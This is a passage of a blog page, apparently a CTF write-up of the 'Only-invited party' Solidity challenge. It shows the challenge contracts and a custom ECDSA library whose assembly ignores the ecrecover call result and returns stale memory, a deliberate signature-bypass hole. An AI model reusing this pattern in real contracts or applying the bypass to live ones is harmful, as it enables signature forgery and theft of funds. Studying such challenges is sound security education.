@@ -1,0 +1,595 @@
+<!doctype html><html lang=en data-theme-mode=true><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Only-invited party | Koyphshi</title><meta name=description content="Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets."><script>window.siteConfig=JSON.parse('{"anchor_icon":null,"base":"https://lanaceryasser.github.io/","clipboard":{"copyright":{"count":50,"enable":false,"license_type":"by-nc-sa"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-br":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ","zh-cn":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-tw":"複製失敗 (ﾟ⊿ﾟ)ﾂ"},"success":{"en":"Copy successfully (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-br":"Copiado com sucesso (*^▽^*)","zh-cn":"复制成功 (*^▽^*)","zh-tw":"複製成功 (*^▽^*)"}},"code_block":{"expand":true},"icon_font":"4552607_4k4bc36ef96","outdate":{"daysago":180,"enable":false,"message":{"en":"This article was last updated on {time}. Please note that the content may no longer be applicable.","ja":"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。","pt-br":"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.","zh-cn":"本文最后更新于 {time}，请注意文中内容可能已不适用。","zh-tw":"本文最後更新於 {time}，請注意文中內容可能已不適用。"}}}')</script><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap" media=print onload='this.media="all"'><link rel=preload href=//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=stylesheet href=/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css><meta property="og:type" content="website"><meta property="og:title" content="Only-invited party | Koyphshi"><meta property="og:description" content="Exploiting unchecked ecrecover return values and dirty memory in inline assembly to bypass signature verification and steal golden tickets."><meta property="og:url" content="https://lanaceryasser.github.io/posts/indit/"><meta property="og:site_name" content="Koyphshi (Dark Mode)"><meta property="og:image" content="/"><meta property="article:author" content="Koyphshi"><meta property="article:published_time" content="2025-12-24T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-24T00:00:00+00:00"><meta property="article:tag" content="blockchainsolidityassemblyecrecoverevm"><meta name=twitter:card content="summary"><meta name=twitter:image content="/"><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/main.min.2ab445531328403f9d181790710209e87710b833ed837cad4a9432828b7ed82e.css><link rel=preload as=style href=https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css integrity=sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE crossorigin=anonymous onload='this.onload=null,this.rel="stylesheet"'><link rel=preload as=style href=https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css integrity=sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI crossorigin=anonymous onload='this.onload=null,this.rel="stylesheet"'><script src=https://npm.webcache.cn/pace-js@1.2.4/pace.min.js integrity=sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8 crossorigin=anonymous></script><link rel=stylesheet href=https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css integrity=sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa crossorigin=anonymous></head><body><div id=loader><div class="loading-left-bg loading-bg"></div><div class="loading-right-bg loading-bg"></div><div class=spinner-box><div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" shape-rendering="geometricPrecision"><path d="M303.5 432a80 80 0 01-12 160 80 80 0 0112-160z" fill="var(--red-1, #ff5252)"/><path d="M512 65a447 447 0 010 894V929a417 417 0 000-834 417 417 0 000 834v30a447 447 0 010-894zm0 30A417 417 0 01929 512 208.5 208.5.0 01720.5 720.5V592a80 80 0 000-160 80 80 0 000 160V720.5A208.5 208.5.0 01512 512 208.5 208.5.0 00303.5 303.5 208.5 208.5.0 0095 512 417 417 0 01512 95z" fill="var(--red-1, #ff5252)"/></svg></div><div class=loading-word>Loading...</div></div></div></div><script>var time=null,loaderEl=document.getElementById("loader"),startLoading=()=>{time=Date.now(),loaderEl.classList.remove("loading")},hideLoader=()=>{document.body.style.overflow="auto",loader.classList.add("loading")},endLoading=()=>{time?Date.now()-time>500?(time=null,hideLoader()):(setTimeout(endLoading,500-(Date.now()-time)),time=null):hideLoader()};window.addEventListener("DOMContentLoaded",endLoading),loaderEl.addEventListener("click",endLoading)</script><div id=copy-tooltip></div><div id=lang-tooltip>This article does not have a corresponding language version</div><div id=heatmap-tooltip></div><div id=container><div id=wrap><div id=header-nav><nav id=main-nav aria-label="Primary navigation"><a class=main-nav-link-wrap href=/><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class=main-nav-link>Home</span>
+</a><a class=main-nav-link-wrap href=/archives><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class=main-nav-link>Archives</span>
+</a><a class=main-nav-link-wrap href=/friend><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class=main-nav-link>Friend</span>
+</a><a id=main-nav-toggle class=nav-icon aria-label="Toggle navigation" role=button></a></nav><nav id=sub-nav aria-label="Secondary navigation"></nav></div><header id=header aria-label="Site header"><picture></picture>
+<img fetchpriority=high src=/images/default-cover.png alt="Only-invited party"><div id=header-outer><div id=header-title><span id=logo><h1 data-aos=slide-up>Only-invited party</h1></span><h2 id=subtitle-wrap data-aos=slide-down></h2></div></div></header><div id=content aria-label="Page content" class=sidebar-right><aside id=sidebar aria-label=Sidebar><div class="sidebar-wrapper-container sticky"><div class=sidebar-wrapper><div class=sidebar-wrap data-aos=fade-up><div class=sidebar-toc-sidebar><h3 class=toc-title>Contents</h3><div class="sidebar-toc-wrapper toc-div-class"><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#file-analysis>File Analysis</a><ul><li><a href=#1-partysol>1. Party.sol</a></li><li><a href=#2-ecdsasol>2. ECDSA.sol</a></li><li><a href=#3-setupsol>3. Setup.sol</a></li></ul></li><li><a href=#the-vulnerability-deep-dive>The Vulnerability Deep Dive</a><ul><li><a href=#understanding-ecrecover-precompile>Understanding ecrecover Precompile</a></li><li><a href=#the-critical-flaw-in-tryrecover>The Critical Flaw in tryRecover</a></li><li><a href=#why-this-works-evm-memory-persistence>Why This Works: EVM Memory Persistence</a></li></ul></li><li><a href=#exploitation-strategy>Exploitation Strategy</a><ul><li><a href=#phase-1-unlocking-the-guardian>Phase 1: Unlocking the Guardian</a></li><li><a href=#phase-2-accumulating-tickets-ghost-balance-attack>Phase 2: Accumulating Tickets (Ghost Balance Attack)</a></li><li><a href=#phase-3-stealing-the-owners-ticket>Phase 3: Stealing the Owner&rsquo;s Ticket</a></li></ul></li><li><a href=#complete-exploit-implementation>Complete Exploit Implementation</a></li><li><a href=#deployment-and-execution>Deployment and Execution</a></li><li><a href=#why-each-step-is-necessary>Why Each Step is Necessary</a><ul><li><a href=#step-1-unlocking-is-required>Step 1: Unlocking is Required</a></li><li><a href=#step-2-multiple-tickets-required>Step 2: Multiple Tickets Required</a></li><li><a href=#step-3-zero-locked-eth-required>Step 3: Zero Locked ETH Required</a></li></ul></li><li><a href=#security-analysis-and-mitigation>Security Analysis and Mitigation</a><ul><li><a href=#the-root-cause>The Root Cause</a></li><li><a href=#proper-implementation>Proper Implementation</a></li><li><a href=#alternative-use-openzeppelin>Alternative: Use OpenZeppelin</a></li></ul></li><li><a href=#key-takeaways>Key Takeaways</a></li><li><a href=#references>References</a></li></ul></nav></div></div><div class="sidebar-common-sidebar hidden"><div class=sidebar-author><img data-src=/%20avatar/avatar.png data-sizes=auto alt=Koyphshi class=lazyload><div class=sidebar-author-name>Koyphshi</div><div class=sidebar-description>Koyphshi - My Personal Blog (Dark & Premium)</div></div><div class=sidebar-state><div class=sidebar-state-article><div>Posts</div><div class=sidebar-state-number>5</div></div><a class=sidebar-state-category href=/%20categories/ aria-label=sidebar-state-category-link><div>Categories</div><div class=sidebar-state-number>2</div></a></div><div class=sidebar-social><div class="icon-github sidebar-social-icon"><a href=https://github.com/LanacerYasser itemprop=url target=_blank aria-label=github rel="noopener nofollow noreferrer"></a></div><div class="icon-linkedin sidebar-social-icon"><a href=https://www.linkedin.com/in/yasser-lanacer-1903442a8/ itemprop=url target=_blank aria-label=linkedin rel="noopener nofollow noreferrer"></a></div></div><div class=sidebar-menu><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/ aria-label=Home></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>Home</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/archives aria-label=Archives></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>Archives</div></div><div class=sidebar-menu-link-wrap><a class=sidebar-menu-link-dummy href=/friend aria-label=Friend></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class=sidebar-menu-link>Friend</div></div></div></div><div class=sidebar-btn-wrapper style=position:static><div class="sidebar-toc-btn current"></div><div class=sidebar-common-btn></div></div></div></div><div class=sidebar-widget></div></div></aside><section id=main aria-label="Main content"><article class="h-entry article" itemscope itemtype=https://schema.org/BlogPosting><div class=article-inner data-aos=fade-up><div class=article-meta><div class=article-date><span class="article-date-link icon-calendar" data-aos=zoom-in><time datetime="2025-12-24 00:00:00 +0000 +0000" itemprop=datePublished>2025-12-24</time>
+<time style=display:none id=post-update-time>2025-12-24</time></span></div></div><div class=hr-line></div><div class="e-content article-entry" itemprop=articleBody><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw"></i>Challenge Info<i class="details-icon fa-solid fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content><ul><li><strong>CTF</strong>: BSides</li><li><strong>Challenge</strong>: Only-invited party</li><li><strong>Category</strong>: Blockchain</li><li><strong>Description</strong>: BSides Algiers are organizing a party and I didn&rsquo;t get invited. Can you kick the boss and invite me instead??</li><li><strong>Author</strong>: 0xbrivan</li></ul></div></div></div><h2 id=challenge-overview><a class=header-anchor href=#challenge-overview></a>Challenge Overview</h2><p>The challenge presents a ticket-based party system where:</p><ul><li>The <strong>owner</strong> (boss) holds the first &ldquo;Golden Ticket&rdquo;</li><li>A <strong>Guardian</strong> contract controls access and validates all transactions</li><li>Players must steal the owner&rsquo;s ticket and accumulate their own tickets</li><li>All operations are protected by ECDSA signature verification</li></ul><p>The win condition requires:</p><ol><li>Owner&rsquo;s ticket balance = 0</li><li>Player&rsquo;s ticket balance > 1</li><li>All locked ETH withdrawn (balance = 0)</li></ol><h2 id=file-analysis><a class=header-anchor href=#file-analysis></a>File Analysis</h2><p>The challenge provided a zip file containing the complete source code with the following structure:</p><h3 id=1-partysol><a class=header-anchor href=#1-partysol></a>1. Party.sol</h3><p>This file contains <strong>two critical contracts</strong>:</p><h4 id=guardian-contract><a class=header-anchor href=#guardian-contract></a>Guardian Contract</h4><p>The gatekeeper contract that manages the party state:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>Guardian</span> {
+</span></span><span style=display:flex><span>    IParty <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>immutable</span> market;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>bool</span> <span style=color:#66d9ef>public</span> locked <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>modifier</span> <span style=color:#a6e22e>onlyUnlocked</span>() {
+</span></span><span style=display:flex><span>        require(<span style=color:#f92672>!</span>locked, <span style=color:#e6db74>&#34;Party not started&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>_</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>startParty</span>(<span style=color:#66d9ef>address</span> sponsor, <span style=color:#66d9ef>bytes</span> calldata signature) <span style=color:#66d9ef>external</span> {
+</span></span><span style=display:flex><span>        require(locked, <span style=color:#e6db74>&#34;Already started&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Verify sponsor is address(0) by checking all bytes
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>uint</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>20</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>            require(<span style=color:#66d9ef>uint8</span>(<span style=color:#66d9ef>bytes20</span>(sponsor)[i]) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;Invalid sponsor&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Verify signature
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>bytes32</span> hash <span style=color:#f92672>=</span> keccak256(abi.encodePacked(sponsor));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>address</span> signer <span style=color:#f92672>=</span> ECDSA.tryRecover(hash, signature);
+</span></span><span style=display:flex><span>        require(signer <span style=color:#f92672>==</span> sponsor, <span style=color:#e6db74>&#34;Invalid signature&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        locked <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>batchTransaction</span>(
+</span></span><span style=display:flex><span>        Order[] calldata orders,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] calldata rs,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] calldata ss,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>uint</span>[<span style=color:#ae81ff>2</span>] calldata vs
+</span></span><span style=display:flex><span>    ) <span style=color:#66d9ef>external</span> onlyUnlocked {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Process batch ticket transfers
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>uint</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> orders.length; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>            market.check(orders[i], rs, ss, vs);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=bsidesparty-contract><a class=header-anchor href=#bsidesparty-contract></a>BSidesParty Contract</h4><p>The main ERC721-like contract managing tickets:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>contract</span> <span style=color:#a6e22e>BSidesParty</span> <span style=color:#66d9ef>is</span> IParty {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>mapping</span>(<span style=color:#66d9ef>address</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>uint256</span>) <span style=color:#66d9ef>public</span> balances;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>mapping</span>(<span style=color:#66d9ef>uint256</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>address</span>) <span style=color:#66d9ef>public</span> ownerOf;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint256</span> <span style=color:#66d9ef>public</span> lockedETH;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint256</span> <span style=color:#66d9ef>public</span> ticketCounter <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>address</span> <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>immutable</span> guardian;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>buy</span>() <span style=color:#66d9ef>external</span> <span style=color:#66d9ef>payable</span> {
+</span></span><span style=display:flex><span>        require(msg.value <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>, <span style=color:#e6db74>&#34;Ticket costs 1 ETH&#34;</span>);
+</span></span><span style=display:flex><span>        require(balances[msg.sender] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;Already have ticket&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        ticketCounter<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>        balances[msg.sender]<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>        ownerOf[ticketCounter] <span style=color:#f92672>=</span> msg.sender;
+</span></span><span style=display:flex><span>        lockedETH <span style=color:#f92672>+=</span> msg.value;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>withdraw</span>(<span style=color:#66d9ef>uint256</span> tokenId) <span style=color:#66d9ef>external</span> {
+</span></span><span style=display:flex><span>        require(ownerOf[tokenId] <span style=color:#f92672>==</span> msg.sender, <span style=color:#e6db74>&#34;Not owner&#34;</span>);
+</span></span><span style=display:flex><span>        require(lockedETH <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>, <span style=color:#e6db74>&#34;Insufficient funds&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        balances[msg.sender]<span style=color:#f92672>--</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>delete</span> ownerOf[tokenId];
+</span></span><span style=display:flex><span>        lockedETH <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>;
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>payable</span>(msg.sender).transfer(<span style=color:#ae81ff>1</span> <span style=color:#66d9ef>ether</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>transfer</span>(<span style=color:#66d9ef>address</span> to, <span style=color:#66d9ef>uint256</span> tokenId) <span style=color:#66d9ef>external</span> {
+</span></span><span style=display:flex><span>        require(ownerOf[tokenId] <span style=color:#f92672>==</span> msg.sender, <span style=color:#e6db74>&#34;Not owner&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        balances[msg.sender]<span style=color:#f92672>--</span>;
+</span></span><span style=display:flex><span>        balances[to]<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>        ownerOf[tokenId] <span style=color:#f92672>=</span> to;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>check</span>(
+</span></span><span style=display:flex><span>        Order calldata order,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] calldata rs,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span>[<span style=color:#ae81ff>2</span>] calldata ss,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>uint</span>[<span style=color:#ae81ff>2</span>] calldata vs
+</span></span><span style=display:flex><span>    ) <span style=color:#66d9ef>external</span> {
+</span></span><span style=display:flex><span>        require(msg.sender <span style=color:#f92672>==</span> guardian, <span style=color:#e6db74>&#34;Only guardian&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Verify host signature
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>bytes32</span> hostHash <span style=color:#f92672>=</span> keccak256(abi.encodePacked(
+</span></span><span style=display:flex><span>            order.host.account,
+</span></span><span style=display:flex><span>            order.invited.account,
+</span></span><span style=display:flex><span>            order.values[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>        ));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>address</span> hostSigner <span style=color:#f92672>=</span> ECDSA.tryRecover(
+</span></span><span style=display:flex><span>            hostHash,
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>uint8</span>(vs[<span style=color:#ae81ff>1</span>]),
+</span></span><span style=display:flex><span>            rs[<span style=color:#ae81ff>1</span>],
+</span></span><span style=display:flex><span>            ss[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>        require(hostSigner <span style=color:#f92672>==</span> order.host.account, <span style=color:#e6db74>&#34;Invalid host signature&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Verify invited signature
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>bytes32</span> invitedHash <span style=color:#f92672>=</span> keccak256(abi.encodePacked(
+</span></span><span style=display:flex><span>            order.invited.account,
+</span></span><span style=display:flex><span>            order.host.account,
+</span></span><span style=display:flex><span>            order.values[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>        ));
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>address</span> invitedSigner <span style=color:#f92672>=</span> ECDSA.tryRecover(
+</span></span><span style=display:flex><span>            invitedHash,
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>uint8</span>(vs[<span style=color:#ae81ff>0</span>]),
+</span></span><span style=display:flex><span>            rs[<span style=color:#ae81ff>0</span>],
+</span></span><span style=display:flex><span>            ss[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>        require(invitedSigner <span style=color:#f92672>==</span> order.invited.account, <span style=color:#e6db74>&#34;Invalid invited signature&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Transfer ticket from host to invited
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>uint256</span> tokenId <span style=color:#f92672>=</span> order.values[<span style=color:#ae81ff>1</span>];
+</span></span><span style=display:flex><span>        require(ownerOf[tokenId] <span style=color:#f92672>==</span> order.host.account, <span style=color:#e6db74>&#34;Host doesn&#39;t own ticket&#34;</span>);
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        balances[order.host.account]<span style=color:#f92672>--</span>;
+</span></span><span style=display:flex><span>        balances[order.invited.account]<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>        ownerOf[tokenId] <span style=color:#f92672>=</span> order.invited.account;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h3 id=2-ecdsasol><a class=header-anchor href=#2-ecdsasol></a>2. ECDSA.sol</h3><p><strong>This is where the vulnerability lives.</strong> A custom implementation of ECDSA signature recovery using inline assembly:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-solidity data-lang=solidity><span style=display:flex><span><span style=color:#66d9ef>library</span> ECDSA {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>tryRecover</span>(
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span> hash,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>uint8</span> v,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span> r,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span> s
+</span></span><span style=display:flex><span>    ) <span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>address</span> result) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>assembly</span> {
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// Prepare memory for ecrecover call
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>let</span> m <span style=color:#f92672>:=</span> <span style=color:#a6e22e>mload</span>(<span style=color:#ae81ff>0x40</span>)  <span style=color:#75715e>// Free memory pointer
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>mstore</span>(m, hash)       <span style=color:#75715e>// Store hash at offset 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x20</span>), v)   <span style=color:#75715e>// Store v at offset 0x20
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x40</span>), r)   <span style=color:#75715e>// Store r at offset 0x40
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x60</span>), s)   <span style=color:#75715e>// Store s at offset 0x60 [!]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// ⚠️ VULNERABILITY: Ignore the return value of staticcall
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#a6e22e>pop</span>(<span style=color:#a6e22e>staticcall</span>(<span style=color:#a6e22e>gas</span>(), <span style=color:#ae81ff>1</span>, m, <span style=color:#ae81ff>0x80</span>, <span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x40</span>), <span style=color:#ae81ff>0x20</span>))
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// Restore the zero slot
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#a6e22e>mstore</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#ae81ff>0x60</span>), <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>            
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// If staticcall succeeds, returndatasize() = 0x20
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// If it fails, returndatasize() = 0x00
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// This XORs the offset: success → 0x60 ^ 0x20 = 0x40
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>//                        failure → 0x60 ^ 0x00 = 0x60
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            result <span style=color:#f92672>:=</span> <span style=color:#a6e22e>mload</span>(<span style=color:#a6e22e>add</span>(m, <span style=color:#a6e22e>xor</span>(<span style=color:#ae81ff>0x60</span>, <span style=color:#a6e22e>returndatasize</span>())))
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>tryRecover</span>(
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes32</span> hash,
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bytes</span> calldata signature
+</span></span><span style=display:flex><span>    ) <span style=color:#66d9ef>internal</span> <span style=color:#66d9ef>view</span> <span style=color:#66d9ef>returns</span> (<span style=color:#66d9ef>address</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (signature.length <span style=color:#f92672>==</span> <span style=color:#ae81ff>65</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>bytes32</span> r;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>bytes32</span> s;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>uint8</span> v;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>assembly</span> {
+</span></span><span style=display:flex><span>                r <span style=color:#f92672>:=</span> <span style=color:#a6e22e>calldataload</span>(signature.offset)
+</span></span><span style=display:flex><span>                s <span style=color:#f92672>:=</span> <span style=color:#a6e22e>calldataload</span>(<span style=color:#a6e22e>add</span>(signature.offset, <span style=color:#ae81ff>0x20</span>))
